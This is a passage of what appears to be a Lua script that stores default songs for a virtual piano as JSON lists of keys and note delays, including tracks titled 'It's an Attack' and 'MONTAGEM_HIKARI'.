  {"key": "Key2G", "delay": 0.125},
  {"key": "Key3A", "delay": 0.125},
  {"key": "Key3A", "delay": 0.125},
  {"key": "Key3A", "delay": 0.25},
  {"key": "Key3B", "delay": 0.125},
  {"key": "Key2Fsharp", "delay": 0.125},
  {"key": "Key3A", "delay": 0.125},
  {"key": "Key3B", "delay": 0.125},
  {"key": "Key3A", "delay": 0.25},
  {"key": "Key3B", "delay": 0.125},
  {"key": "Key3A", "delay": 0.25},
  {"key": "Key3B", "delay": 0.125},
  {"key": "Key1Fsharp", "delay": 0.25},
  {"key": "Key2E", "delay": 0.25},
  {"key": "Key2E", "delay": 0.25},
  {"key": "Key1E", "delay": 0.25},
  {"key": "Key2D", "delay": 0.25},
  {"key": "Key2D", "delay": 0.25},
  {"key": "Key1D", "delay": 0.125},
  {"key": "Key3B", "delay": 0.125},
  {"key": "Key1D", "delay": 0.25},
  {"key": "Key3A", "delay": 0.25},
  {"key": "Key2G", "delay": 0.25},
  {"key": "Key3B", "delay": 0.25},
  {"key": "Key1G", "delay": 0.25},
  {"key": "Key1G", "delay": 0.25},
  {"key": "Key1G", "delay": 0.375},
  {"key": "Key3A", "delay": 0.125},
  {"key": "Key1G", "delay": 0.25},
  {"key": "Key2D", "delay": 0.25},
  {"key": "Key1G", "delay": 0.25},
  {"key": "Key3B", "delay": 0.25},
  {"key": "Key1G", "delay": 0.25},
  {"key": "Key1G", "delay": 0.25},
  {"key": "Key1G", "delay": 0.375},
  {"key": "Key3A", "delay": 0.125},
  {"key": "Key1G", "delay": 0.25},
  {"key": "Key2D", "delay": 0.25},
  {"key": "Key1G", "delay": 0.25},
  {"key": "Key3B", "delay": 0.25},
  {"key": "Key1Fsharp", "delay": 0.25},
  {"key": "Key1Fsharp", "delay": 0.25},
  {"key": "Key1Fsharp", "delay": 0.375},
  {"key": "Key3A", "delay": 0.125},
  {"key": "Key1Fsharp", "delay": 0.25},
  {"key": "Key3B", "delay": 0.25},
  {"key": "Key1Fsharp", "delay": 0.25},
  {"key": "Key3A", "delay": 0.25},
  {"key": "Key1E", "delay": 0.25},
  {"key": "Key2E", "delay": 0.25},
  {"key": "Key1D", "delay": 0.375},
  {"key": "Key2E", "delay": 0.125},
  {"key": "Key1D", "delay": 0.25},
  {"key": "Key2Fsharp", "delay": 0.25},
  {"key": "Key1D", "delay": 0.25},
  {"key": "Key2G", "delay": 0.24992},
  {"key": "Key2G", "delay": 0.115385},
  {"key": "Key2G", "delay": 0.115385},
  {"key": "Key2Fsharp", "delay": 0.115385},
  {"key": "Key2G", "delay": 0.115385},
  {"key": "Key2G", "delay": 0.115385},
  {"key": "Key2Fsharp", "delay": 0.115384},
  {"key": "Key2G", "delay": 0.115385},
  {"key": "Key2G", "delay": 0.115385},
  {"key": "Key2Fsharp", "delay": 0.115385},
  {"key": "Key2G", "delay": 0.115385},
  {"key": "Key2G", "delay": 0.115385},
  {"key": "Key2Fsharp", "delay": 0.115384},
  {"key": "Key2G", "delay": 0.115385},
  {"key": "Key2G", "delay": 0.115385},
  {"key": "Key2G", "delay": 0.230769},
  {"key": "Key3A", "delay": 0.115385},
  {"key": "Key3A", "delay": 0.115384},
  {"key": "Key2G", "delay": 0.115385},
  {"key": "Key3A", "delay": 0.115385},
  {"key": "Key3A", "delay": 0.115385},
  {"key": "Key2G", "delay": 0.115385},
  {"key": "Key3A", "delay": 0.115385},
  {"key": "Key3A", "delay": 0.115384},
  {"key": "Key2G", "delay": 0.115385},
  {"key": "Key3A", "delay": 0.115385},
  {"key": "Key3A", "delay": 0.115385},
  {"key": "Key2G", "delay": 0.115385},
  {"key": "Key3A", "delay": 0.115385},
  {"key": "Key3A", "delay": 0.115384},
  {"key": "Key3A", "delay": 0.230769},
  {"key": "Key3B", "delay": 0.115385},
  {"key": "Key2Fsharp", "delay": 0.115385},
  {"key": "Key3A", "delay": 0.115385},
  {"key": "Key3B", "delay": 0.115384},
  {"key": "Key3A", "delay": 0.230769},
  {"key": "Key3B", "delay": 0.115385},
  {"key": "Key3A", "delay": 0.230769},
  {"key": "Key3B", "delay": 0.115384},
  {"key": "Key1Fsharp", "delay": 0.230769},
  {"key": "Key2E", "delay": 0.230769},
  {"key": "Key2E", "delay": 0.230769},
  {"key": "Key1E", "delay": 0.230769},
  {"key": "Key2D", "delay": 0.230769},
  {"key": "Key2D", "delay": 0.230769},
  {"key": "Key1D", "delay": 0.115384},
  {"key": "Key3B", "delay": 0.115385},
  {"key": "Key1D", "delay": 0.230769},
  {"key": "Key3A", "delay": 0.230769},
  {"key": "Key2G", "delay": 0.230769},
  {"key": "Key3B", "delay": 0.230769},
  {"key": "Key3B", "delay": 0.461538},
  {"key": "Key3A", "delay": 0.461538},
  {"key": "Key3A", "delay": 0.461538},
  {"key": "Key3B", "delay": 0.461538},
  {"key": "Key3B", "delay": 0.461538},
  {"key": "Key3A", "delay": 0.461538},
  {"key": "Key3A", "delay": 0.461538},
  {"key": "Key3B", "delay": 0.461538},
  {"key": "Key3B", "delay": 0.461538},
  {"key": "Key2E", "delay": 0.461538},
  {"key": "Key2E", "delay": 0.230769},
  {"key": "Key2E", "delay": 0.230769},
  {"key": "Key2Fsharp", "delay": 0.230769},
  {"key": "Key2G", "delay": 0.230769},
  {"key": "Key2Fsharp", "delay": 0.230769},
  {"key": "Key2E", "delay": 0.230769},
  {"key": "Key2D", "delay": 0.230769},
  {"key": "Key2E", "delay": 0.230769},
  {"key": "Key2G", "delay": 0.923076},
  {"key": "Key2G", "delay": 0.230769},
  {"key": "Key2G", "delay": 0.230769},
  {"key": "Key1G", "delay": 0.115385},
  {"key": "Key2Fsharp", "delay": 0.115384},
  {"key": "Key2G", "delay": 0.230769},
  {"key": "Key1G", "delay": 0.115385},
  {"key": "Key3A", "delay": 0.115385},
  {"key": "Key2G", "delay": 0.115385},
  {"key": "Key1G", "delay": 0.230769},
  {"key": "Key1G", "delay": 0.115385},
  {"key": "Key2G", "delay": 0.230769},
  {"key": "Key2G", "delay": 0.230769},
  {"key": "Key2G", "delay": 0.230769},
  {"key": "Key1G", "delay": 0.115385},
  {"key": "Key2Fsharp", "delay": 0.115385},
  {"key": "Key2G", "delay": 0.230769},
  {"key": "Key1G", "delay": 0.115385},
  {"key": "Key3A", "delay": 0.115385},
  {"key": "Key2G", "delay": 0.115385},
  {"key": "Key1G", "delay": 0.230769},
  {"key": "Key1G", "delay": 0.115384},
  {"key": "Key2Fsharp", "delay": 0.230769},
  {"key": "Key2Fsharp", "delay": 0.230769},
  {"key": "Key2Fsharp", "delay": 0.230769},
  {"key": "Key1G", "delay": 0.115385},
  {"key": "Key2D", "delay": 0.115385},
  {"key": "Key2Fsharp", "delay": 0.230769},
  {"key": "Key1G", "delay": 0.115385},
  {"key": "Key2G", "delay": 0.115384},
  {"key": "Key2Fsharp", "delay": 0.115385},
  {"key": "Key1G", "delay": 0.230769},
  {"key": "Key1G", "delay": 0.115385},
  {"key": "Key2G", "delay": 0.230769},
  {"key": "Key2G", "delay": 0.230769},
  {"key": "Key2G", "delay": 0.230769},
  {"key": "Key1Fsharp", "delay": 0.115385},
  {"key": "Key2Fsharp", "delay": 0.115384},
  {"key": "Key2G", "delay": 0.230769},
  {"key": "Key1Fsharp", "delay": 0.115385},
  {"key": "Key3A", "delay": 0.115385},
  {"key": "Key2G", "delay": 0.115385},
  {"key": "Key1Fsharp", "delay": 0.230769},
  {"key": "Key1Fsharp", "delay": 0.115385},
  {"key": "Key2G", "delay": 0.230769},
  {"key": "Key2G", "delay": 0.230769},
  {"key": "Key2G", "delay": 0.230769},
  {"key": "Key1G", "delay": 0.115385},
  {"key": "Key2Fsharp", "delay": 0.115385},
  {"key": "Key2G", "delay": 0.230769},
  {"key": "Key1G", "delay": 0.115384},
  {"key": "Key3A", "delay": 0.115385},
  {"key": "Key2G", "delay": 0.115385},
  {"key": "Key1G", "delay": 0.230769},
  {"key": "Key1G", "delay": 0.115385},
  {"key": "Key2G", "delay": 0.230769},
  {"key": "Key2G", "delay": 0.230769},
  {"key": "Key2G", "delay": 0.230769},
  {"key": "Key1G", "delay": 0.115384},
  {"key": "Key2Fsharp", "delay": 0.115385},
  {"key": "Key2G", "delay": 0.230769},
  {"key": "Key1G", "delay": 0.115385},
  {"key": "Key3A", "delay": 0.115385},
  {"key": "Key2G", "delay": 0.115384},
  {"key": "Key1G", "delay": 0.230769},
  {"key": "Key1G", "delay": 0.115385},
  {"key": "Key2Fsharp", "delay": 0.230769},
  {"key": "Key2Fsharp", "delay": 0.230769},
  {"key": "Key2B", "delay": 0.115385},
  {"key": "Key2Fsharp", "delay": 0.115385},
  {"key": "Key1G", "delay": 0.115385},
  {"key": "Key2D", "delay": 0.115385},
  {"key": "Key2Fsharp", "delay": 0.230769},
  {"key": "Key1G", "delay": 0.115385},
  {"key": "Key2G", "delay": 0.115385},
  {"key": "Key2Fsharp", "delay": 0.115385},
  {"key": "Key1G", "delay": 0.230769},
  {"key": "Key1G", "delay": 0.115384},
  {"key": "Key2G", "delay": 0.230769},
  {"key": "Key2G", "delay": 0.230769},
  {"key": "Key2G", "delay": 0.230769},
  {"key": "Key1Fsharp", "delay": 0.115385},
  {"key": "Key2Fsharp", "delay": 0.115385},
  {"key": "Key2G", "delay": 0.230769},
  {"key": "Key1Fsharp", "delay": 0.115385},
  {"key": "Key3A", "delay": 0.115384},
  {"key": "Key2G", "delay": 0.115385},
  {"key": "Key1Fsharp", "delay": 0.230769},
  {"key": "Key1Fsharp", "delay": 0.115385},
  {"key": "Key2G", "delay": 0.230769},
  {"key": "Key2G", "delay": 0.230769},
  {"key": "Key2G", "delay": 0.230769},
  {"key": "Key2Fsharp", "delay": 0.230769},
  {"key": "Key2G", "delay": 0.230769},
  {"key": "Key3A", "delay": 0.230769},
  {"key": "Key2G", "delay": 0.115385},
  {"key": "Key2G", "delay": 0.576922},
  {"key": "Key2G", "delay": 0.230769},
  {"key": "Key2G", "delay": 0.230769},
  {"key": "Key2Fsharp", "delay": 0.230769},
  {"key": "Key2G", "delay": 0.230769},
  {"key": "Key3A", "delay": 0.230769},
  {"key": "Key2G", "delay": 0.115385},
  {"key": "Key2Fsharp", "delay": 0.576922},
  {"key": "Key2Fsharp", "delay": 0.230769},
  {"key": "Key2Fsharp", "delay": 0.230769},
  {"key": "Key2D", "delay": 0.230769},
  {"key": "Key2Fsharp", "delay": 0.230769},
  {"key": "Key2G", "delay": 0.230769},
  {"key": "Key2Fsharp", "delay": 0.115384},
  {"key": "Key2G", "delay": 0.576922},
  {"key": "Key2G", "delay": 0.230769},
  {"key": "Key2G", "delay": 0.230769},
  {"key": "Key2Fsharp", "delay": 0.230769},
  {"key": "Key2G", "delay": 0.230769},
  {"key": "Key3A", "delay": 0.230769},
  {"key": "Key2G", "delay": 0.115384},
  {"key": "Key2G", "delay": 0.576923},
  {"key": "Key2G", "delay": 0.230769},
  {"key": "Key2G", "delay": 0.230769},
  {"key": "Key2Fsharp", "delay": 0.230769},
  {"key": "Key2G", "delay": 0.230769},
  {"key": "Key3A", "delay": 0.230769},
  {"key": "Key2G", "delay": 0.115385},
  {"key": "Key2G", "delay": 0.576922},
  {"key": "Key2G", "delay": 0.230769},
  {"key": "Key2G", "delay": 0.230769},
  {"key": "Key2Fsharp", "delay": 0.230769},
  {"key": "Key2G", "delay": 0.230769},
  {"key": "Key3A", "delay": 0.230769},
  {"key": "Key2G", "delay": 0.115385},
  {"key": "Key2Fsharp", "delay": 0.576922},
  {"key": "Key2Fsharp", "delay": 0.230769},
  {"key": "Key2Fsharp", "delay": 0.230769},
  {"key": "Key2D", "delay": 0.230769},
  {"key": "Key2Fsharp", "delay": 0.230769},
  {"key": "Key2G", "delay": 0.230769},
  {"key": "Key2Fsharp", "delay": 0.115385},
  {"key": "Key2G", "delay": 0.576922},
  {"key": "Key2G", "delay": 0.230769},
  {"key": "Key2G", "delay": 0.230769},
  {"key": "Key2Fsharp", "delay": 0.230769},
  {"key": "Key2G", "delay": 0.230769},
  {"key": "Key3A", "delay": 0.230769},
  {"key": "Key2G", "delay": 0.115385},
  {"key": "Key2G", "delay": 0.576923},
  {"key": "Key2G", "delay": 0.230769},
  {"key": "Key2G", "delay": 0.230769},
  {"key": "Key2Fsharp", "delay": 0.230769},
  {"key": "Key2G", "delay": 0.230769},
  {"key": "Key3A", "delay": 0.230769},
  {"key": "Key2G", "delay": 0.115385},
  {"key": "Key2G", "delay": 0.576922},
  {"key": "Key2G", "delay": 0.230769},
  {"key": "Key2G", "delay": 0.230769},
  {"key": "Key2Fsharp", "delay": 0.230769},
  {"key": "Key2G", "delay": 0.230769},
  {"key": "Key3A", "delay": 0.230769},
  {"key": "Key2G", "delay": 0.115385},
  {"key": "Key2Fsharp", "delay": 0.576922},
  {"key": "Key2Fsharp", "delay": 0.230769},
  {"key": "Key2Fsharp", "delay": 0.230769},
  {"key": "Key2D", "delay": 0.230769},
  {"key": "Key2Fsharp", "delay": 0.230769},
  {"key": "Key2G", "delay": 0.230769},
  {"key": "Key2Fsharp", "delay": 0.115385},
  {"key": "Key2G", "delay": 0.576923},
  {"key": "Key2G", "delay": 0.230769},
  {"key": "Key2G", "delay": 0.230769},
  {"key": "Key2Fsharp", "delay": 0.230769},
  {"key": "Key2G", "delay": 0.230769},
  {"key": "Key3A", "delay": 0.230769},
  {"key": "Key2G", "delay": 0.115385}
]
]]

    -- ========================================================================
    -- Default Song: unhappyBX制作 (It's an Attack)
    -- ========================================================================
    local DEFAULT_SONG_GONGKYEOKJEON = [[
[
 [
  {
    "key": "Key2C",
    "delay": 0
  },
  {
    "key": "Key1Gsharp",
    "delay": 0.618557
  },
  {
    "key": "Key2Dsharp",
    "delay": 0.618557
  },
  {
    "key": "Key2Csharp",
    "delay": 0.309279
  },
  {
    "key": "Key2C",
    "delay": 0.309279
  },
  {
    "key": "Key2Csharp",
    "delay": 0.309279
  },
  {
    "key": "Key2C",
    "delay": 0.309279
  },
  {
    "key": "Key1C",
    "delay": 0.309279
  },
  {
    "key": "Key1Gsharp",
    "delay": 0.309279
  },
  {
    "key": "Key1C",
    "delay": 0.309279
  },
  {
    "key": "Key1G",
    "delay": 0.309279
  },
  {
    "key": "Key1Gsharp",
    "delay": 0.309279
  },
  {
    "key": "Key2C",
    "delay": 0.309279
  },
  {
    "key": "Key2Csharp",
    "delay": 0.309279
  },
  {
    "key": "Key2C",
    "delay": 0.309279
  },
  {
    "key": "Key1Gsharp",
    "delay": 0.618557
  },
  {
    "key": "Key2Dsharp",
    "delay": 0.618557
  },
  {
    "key": "Key2Csharp",
    "delay": 0.309279
  },
  {
    "key": "Key2C",
    "delay": 0.309279
  },
  {
    "key": "Key2Csharp",
    "delay": 0.309279
  },
  {
    "key": "Key2C",
    "delay": 0.309279
  },
  {
    "key": "Key1C",
    "delay": 0.309279
  },
  {
    "key": "Key1Gsharp",
    "delay": 0.309279
  },
  {
    "key": "Key1C",
    "delay": 0.309279
  },
  {
    "key": "Key2F",
    "delay": 0.309279
  },
  {
    "key": "Key2C",
    "delay": 0.618557
  },
  {
    "key": "Key2C",
    "delay": 0.618557
  },
  {
    "key": "Key1Gsharp",
    "delay": 0.618557
  },
  {
    "key": "Key2Dsharp",
    "delay": 0.618557
  },
  {
    "key": "Key2Csharp",
    "delay": 0.309279
  },
  {
    "key": "Key2C",
    "delay": 0.309279
  },
  {
    "key": "Key2Csharp",
    "delay": 0.309279
  },
  {
    "key": "Key2C",
    "delay": 0.309279
  },
  {
    "key": "Key1C",
    "delay": 0.309279
  },
  {
    "key": "Key1Gsharp",
    "delay": 0.309279
  },
  {
    "key": "Key1C",
    "delay": 0.309279
  },
  {
    "key": "Key1G",
    "delay": 0.309279
  },
  {
    "key": "Key1Gsharp",
    "delay": 0.309279
  },
  {
    "key": "Key2C",
    "delay": 0.309279
  },
  {
    "key": "Key2Csharp",
    "delay": 0.309279
  },
  {
    "key": "Key2C",
    "delay": 0.309279
  },
  {
    "key": "Key1Gsharp",
    "delay": 0.618557
  },
  {
    "key": "Key2Dsharp",
    "delay": 0.618557
  },
  {
    "key": "Key2Csharp",
    "delay": 0.309279
  },
  {
    "key": "Key2C",
    "delay": 0.309279
  },
  {
    "key": "Key2Csharp",
    "delay": 0.309279
  },
  {
    "key": "Key2C",
    "delay": 0.309279
  },
  {
    "key": "Key1C",
    "delay": 0.309279
  },
  {
    "key": "Key1Gsharp",
    "delay": 0.309279
  },
  {
    "key": "Key1C",
    "delay": 0.309279
  },
  {
    "key": "Key2F",
    "delay": 0.309279
  },
  {
    "key": "Key2C",
    "delay": 0.618557
  },
  {
    "key": "Key2C",
    "delay": 0
  },
  {
    "key": "Key1Gsharp",
    "delay": 0.618557
  },
  {
    "key": "Key2Dsharp",
    "delay": 0.618557
  },
  {
    "key": "Key2Csharp",
    "delay": 0.309279
  },
  {
    "key": "Key2C",
    "delay": 0.309279
  },
  {
    "key": "Key2Csharp",
    "delay": 0.309279
  },
  {
    "key": "Key2C",
    "delay": 0.309279
  },
  {
    "key": "Key1C",
    "delay": 0.309279
  },
  {
    "key": "Key1Gsharp",
    "delay": 0.309279
  },
  {
    "key": "Key1C",
    "delay": 0.309279
  },
  {
    "key": "Key1G",
    "delay": 0.309279
  },
  {
    "key": "Key1Gsharp",
    "delay": 0.309279
  },
  {
    "key": "Key2C",
    "delay": 0.309279
  },
  {
    "key": "Key2Csharp",
    "delay": 0.309279
  },
  {
    "key": "Key2C",
    "delay": 0.309279
  },
  {
    "key": "Key1Gsharp",
    "delay": 0.618557
  },
  {
    "key": "Key2Dsharp",
    "delay": 0.618557
  },
  {
    "key": "Key2Csharp",
    "delay": 0.309279
  },
  {
    "key": "Key2C",
    "delay": 0.309279
  },
  {
    "key": "Key2Csharp",
    "delay": 0.309279
  },
  {
    "key": "Key2C",
    "delay": 0.309279
  },
  {
    "key": "Key1C",
    "delay": 0.309279
  },
  {
    "key": "Key1Gsharp",
    "delay": 0.309279
  },
  {
    "key": "Key1C",
    "delay": 0.309279
  },
  {
    "key": "Key2F",
    "delay": 0.309279
  },
  {
    "key": "Key2C",
    "delay": 0.618557
  },
  {
    "key": "Key2C",
    "delay": 0.618557
  },
  {
    "key": "Key1Gsharp",
    "delay": 0.618557
  },
  {
    "key": "Key2Dsharp",
    "delay": 0.618557
  },
  {
    "key": "Key2Csharp",
    "delay": 0.309279
  },
  {
    "key": "Key2C",
    "delay": 0.309279
  },
  {
    "key": "Key2Csharp",
    "delay": 0.309279
  },
  {
    "key": "Key2C",
    "delay": 0.309279
  },
  {
    "key": "Key1C",
    "delay": 0.309279
  },
  {
    "key": "Key1Gsharp",
    "delay": 0.309279
  },
  {
    "key": "Key1C",
    "delay": 0.309279
  },
  {
    "key": "Key1G",
    "delay": 0.309279
  },
  {
    "key": "Key1Gsharp",
    "delay": 0.309279
  },
  {
    "key": "Key2C",
    "delay": 0.309279
  },
  {
    "key": "Key2Csharp",
    "delay": 0.309279
  },
  {
    "key": "Key2C",
    "delay": 0.309279
  },
  {
    "key": "Key1Gsharp",
    "delay": 0.618557
  },
  {
    "key": "Key2Dsharp",
    "delay": 0.618557
  },
  {
    "key": "Key2Csharp",
    "delay": 0.309279
  },
  {
    "key": "Key2C",
    "delay": 0.309279
  },
  {
    "key": "Key2Csharp",
    "delay": 0.309279
  },
  {
    "key": "Key2C",
    "delay": 0.309279
  },
  {
    "key": "Key1C",
    "delay": 0.309279
  },
  {
    "key": "Key1Gsharp",
    "delay": 0.309279
  },
  {
    "key": "Key1C",
    "delay": 0.309279
  },
  {
    "key": "Key2F",
    "delay": 0.309279
  },
  {
    "key": "Key2C",
    "delay": 0.618557
  },
  {
    "key": "Key2C",
    "delay": 0
  },
  {
    "key": "Key1Gsharp",
    "delay": 0.618557
  },
  {
    "key": "Key2Dsharp",
    "delay": 0.618557
  },
  {
    "key": "Key2Csharp",
    "delay": 0.309279
  },
  {
    "key": "Key2C",
    "delay": 0.309279
  },
  {
    "key": "Key2Csharp",
    "delay": 0.309279
  },
  {
    "key": "Key2C",
    "delay": 0.309279
  },
  {
    "key": "Key1C",
    "delay": 0.309279
  },
  {
    "key": "Key1Gsharp",
    "delay": 0.309279
  },
  {
    "key": "Key1C",
    "delay": 0.309279
  },
  {
    "key": "Key1G",
    "delay": 0.309279
  },
  {
    "key": "Key1Gsharp",
    "delay": 0.309279
  },
  {
    "key": "Key2C",
    "delay": 0.309279
  },
  {
    "key": "Key2Csharp",
    "delay": 0.309279
  },
  {
    "key": "Key2C",
    "delay": 0.309279
  },
  {
    "key": "Key1Gsharp",
    "delay": 0.618557
  },
  {
    "key": "Key2Dsharp",
    "delay": 0.618557
  },
  {
    "key": "Key2Csharp",
    "delay": 0.309279
  },
  {
    "key": "Key2C",
    "delay": 0.309279
  },
  {
    "key": "Key2Csharp",
    "delay": 0.309279
  },
  {
    "key": "Key2C",
    "delay": 0.309279
  },
  {
    "key": "Key1C",
    "delay": 0.309279
  },
  {
    "key": "Key1Gsharp",
    "delay": 0.309279
  },
  {
    "key": "Key1C",
    "delay": 0.309279
  },
  {
    "key": "Key2F",
    "delay": 0.309279
  },
  {
    "key": "Key2C",
    "delay": 0.618557
  },
  {
    "key": "Key2C",
    "delay": 0.618557
  },
  {
    "key": "Key1Gsharp",
    "delay": 0.618557
  },
  {
    "key": "Key2Dsharp",
    "delay": 0.618557
  },
  {
    "key": "Key2Csharp",
    "delay": 0.309279
  },
  {
    "key": "Key2C",
    "delay": 0.309279
  },
  {
    "key": "Key2Csharp",
    "delay": 0.309279
  },
  {
    "key": "Key2C",
    "delay": 0.309279
  },
  {
    "key": "Key1C",
    "delay": 0.309279
  },
  {
    "key": "Key1Gsharp",
    "delay": 0.309279
  },
  {
    "key": "Key1C",
    "delay": 0.309279
  },
  {
    "key": "Key1G",
    "delay": 0.309279
  },
  {
    "key": "Key1Gsharp",
    "delay": 0.309279
  },
  {
    "key": "Key2C",
    "delay": 0.309279
  },
  {
    "key": "Key2Csharp",
    "delay": 0.309279
  },
  {
    "key": "Key2C",
    "delay": 0.309279
  },
  {
    "key": "Key1Gsharp",
    "delay": 0.618557
  },
  {
    "key": "Key2Dsharp",
    "delay": 0.618557
  },
  {
    "key": "Key2Csharp",
    "delay": 0.309279
  },
  {
    "key": "Key2C",
    "delay": 0.309279
  },
  {
    "key": "Key2Csharp",
    "delay": 0.309279
  },
  {
    "key": "Key2C",
    "delay": 0.309279
  },
  {
    "key": "Key1C",
    "delay": 0.309279
  },
  {
    "key": "Key1Gsharp",
    "delay": 0.309279
  },
  {
    "key": "Key1C",
    "delay": 0.309279
  },
  {
    "key": "Key2F",
    "delay": 0.309279
  },
  {
    "key": "Key2C",
    "delay": 0.618557
  },
  {
    "key": "Key2C",
    "delay": 0
  },
  {
    "key": "Key1Gsharp",
    "delay": 0.618557
  },
  {
    "key": "Key2Dsharp",
    "delay": 0.618557
  },
  {
    "key": "Key2Csharp",
    "delay": 0.309279
  },
  {
    "key": "Key2C",
    "delay": 0.309279
  },
  {
    "key": "Key2Csharp",
    "delay": 0.309279
  },
  {
    "key": "Key2C",
    "delay": 0.309279
  },
  {
    "key": "Key1C",
    "delay": 0.309279
  },
  {
    "key": "Key1Gsharp",
    "delay": 0.309279
  },
  {
    "key": "Key1C",
    "delay": 0.309279
  },
  {
    "key": "Key1G",
    "delay": 0.309279
  },
  {
    "key": "Key1Gsharp",
    "delay": 0.309279
  },
  {
    "key": "Key2C",
    "delay": 0.309279
  },
  {
    "key": "Key2Csharp",
    "delay": 0.309279
  },
  {
    "key": "Key2C",
    "delay": 0.309279
  },
  {
    "key": "Key1Gsharp",
    "delay": 0.618557
  },
  {
    "key": "Key2Dsharp",
    "delay": 0.618557
  },
  {
    "key": "Key2Csharp",
    "delay": 0.309279
  },
  {
    "key": "Key2C",
    "delay": 0.309279
  },
  {
    "key": "Key2Csharp",
    "delay": 0.309279
  },
  {
    "key": "Key2C",
    "delay": 0.309279
  },
  {
    "key": "Key1C",
    "delay": 0.309279
  },
  {
    "key": "Key1Gsharp",
    "delay": 0.309279
  },
  {
    "key": "Key1C",
    "delay": 0.309279
  },
  {
    "key": "Key2F",
    "delay": 0.309279
  },
  {
    "key": "Key2C",
    "delay": 0.618557
  },
  {
    "key": "Key2C",
    "delay": 0.618557
  },
  {
    "key": "Key1Gsharp",
    "delay": 0.618557
  },
  {
    "key": "Key2Dsharp",
    "delay": 0.618557
  },
  {
    "key": "Key2Csharp",
    "delay": 0.309279
  },
  {
    "key": "Key2C",
    "delay": 0.309279
  },
  {
    "key": "Key2Csharp",
    "delay": 0.309279
  }
    -- ========================================================================
    -- Default Song: MONTAGEM_HIKARI
    -- ========================================================================
    local DEFAULT_SONG_MONTAGEM_HIKARI = [[
[
  {"key": "Key2E", "delay": 0.25},
  {"key": "Key2D", "delay": 0.25},
  {"key": "Key2E", "delay": 0.25},
  {"key": "Key2G", "delay": 0.25},
  {"key": "Key2E", "delay": 0.25},
  {"key": "Key2D", "delay": 0.25},
  {"key": "Key2E", "delay": 0.75},
  {"key": "Key2D", "delay": 0.25},
  {"key": "Key2E", "delay": 0.25},
  {"key": "Key2G", "delay": 0.25},
  {"key": "Key2E", "delay": 0.25},
  {"key": "Key2D", "delay": 0.25},
  {"key": "Key2E", "delay": 0.75},
  {"key": "Key2D", "delay": 0.25},
  {"key": "Key2E", "delay": 0.25},
  {"key": "Key2G", "delay": 0.25},
  {"key": "Key2E", "delay": 0.25},
  {"key": "Key2D", "delay": 0.25},
  {"key": "Key2E", "delay": 0.25},
  {"key": "Key3C", "delay": 0.25},
  {"key": "Key3B", "delay": 0.5},
  {"key": "Key2G", "delay": 0.5},
  {"key": "Key2E", "delay": 0.5},
  {"key": "Key3A", "delay": 0.25},
  {"key": "Key2G", "delay": 0.25},
  {"key": "Key2E", "delay": 0.25},
  {"key": "Key2D", "delay": 0.25},
  {"key": "Key2E", "delay": 0.25},
  {"key": "Key2G", "delay": 0.25},
  {"key": "Key2E", "delay": 0.25},
  {"key": "Key2D", "delay": 0.25},
  {"key": "Key2E", "delay": 0.25},
  {"key": "Key2G", "delay": 0.25},
  {"key": "Key2E", "delay": 0.25},
  {"key": "Key2D", "delay": 0.25},
  {"key": "Key2E", "delay": 0.25},
  {"key": "Key2G", "delay": 0.25},
  {"key": "Key2E", "delay": 0.25},
  {"key": "Key2C", "delay": 0.25},
  {"key": "Key2C", "delay": 0.25},
  {"key": "Key2C", "delay": 0.25},
  {"key": "Key2E", "delay": 0.25},
  {"key": "Key2D", "delay": 0.25},
  {"key": "Key2E", "delay": 0.25},
  {"key": "Key2G", "delay": 0.25},
  {"key": "Key2E", "delay": 0.25},
  {"key": "Key2D", "delay": 0.25},
  {"key": "Key2G", "delay": 0.25},
  {"key": "Key2G", "delay": 0.25},
  {"key": "Key3A", "delay": 0.25},
  {"key": "Key3C", "delay": 0.25},
  {"key": "Key2D", "delay": 0.25},
  {"key": "Key2E", "delay": 0.25},
  {"key": "Key2F", "delay": 0.25},
  {"key": "Key2E", "delay": 0.25},
  {"key": "Key2D", "delay": 0.25},
  {"key": "Key3C", "delay": 0.25},
  {"key": "Key2E", "delay": 0.5},
  {"key": "Key2G", "delay": 1.25},
  {"key": "Key2G", "delay": 0.25},
  {"key": "Key3A", "delay": 0.25},
  {"key": "Key3C", "delay": 0.25},
  {"key": "Key2D", "delay": 0.25},
  {"key": "Key2E", "delay": 0.25},
  {"key": "Key2F", "delay": 0.25},
  {"key": "Key2E", "delay": 0.25},
  {"key": "Key2D", "delay": 0.25},
  {"key": "Key3C", "delay": 0.25},
  {"key": "Key3C", "delay": 0.5},
  {"key": "Key3C", "delay": 0.5},
  {"key": "Key3C", "delay": 0.5},
  {"key": "Key2E", "delay": 0.25},
  {"key": "Key2D", "delay": 0.25},
  {"key": "Key2G", "delay": 0.75},
  {"key": "Key2G", "delay": 0.25},
  {"key": "Key2G", "delay": 0.25},
  {"key": "Key2G", "delay": 0.25},
  {"key": "Key2G", "delay": 0.25},
  {"key": "Key2G", "delay": 0.25},
  {"key": "Key2G", "delay": 0.5},
  {"key": "Key2G", "delay": 0.5},
  {"key": "Key2G", "delay": 0.5},
  {"key": "Key2G", "delay": 0.25},
  {"key": "Key2G", "delay": 0.25},
  {"key": "Key3A", "delay": 0.25},
  {"key": "Key3C", "delay": 0.25},
  {"key": "Key2D", "delay": 0.25},
  {"key": "Key2E", "delay": 0.25},
  {"key": "Key2F", "delay": 0.25},
  {"key": "Key2E", "delay": 0.25},
  {"key": "Key2D", "delay": 0.25},
  {"key": "Key3C", "delay": 0.25},
  {"key": "Key3C", "delay": 0.5},
  {"key": "Key3C", "delay": 0.5},
  {"key": "Key3C", "delay": 0.5},
  {"key": "Key2G", "delay": 0.5},
  {"key": "Key3A", "delay": 0.25},
  {"key": "Key3C", "delay": 0.25},
  {"key": "Key2D", "delay": 0.25},
  {"key": "Key2E", "delay": 0.25},
  {"key": "Key2F", "delay": 0.25},
  {"key": "Key2E", "delay": 0.25},
  {"key": "Key2D", "delay": 0.25},
  {"key": "Key3C", "delay": 0.25},
  {"key": "Key2C", "delay": 0.5},
  {"key": "Key2C", "delay": 0.25},
  {"key": "Key2C", "delay": 0.25},
  {"key": "Key2D", "delay": 0.25},
  {"key": "Key2C", "delay": 0.25},
  {"key": "Key2B", "delay": 0.25},
  {"key": "Key2G", "delay": 0.75},
  {"key": "Key3A", "delay": 0.25},
  {"key": "Key2E", "delay": 0.25},
  {"key": "Key2E", "delay": 0.5},
  {"key": "Key2D", "delay": 0.083333},
  {"key": "Key2C", "delay": 0.083333},
  {"key": "Key2C", "delay": 0.833333},
  {"key": "Key2C", "delay": 0.25},
  {"key": "Key2C", "delay": 0.25},
  {"key": "Key2D", "delay": 0.25},
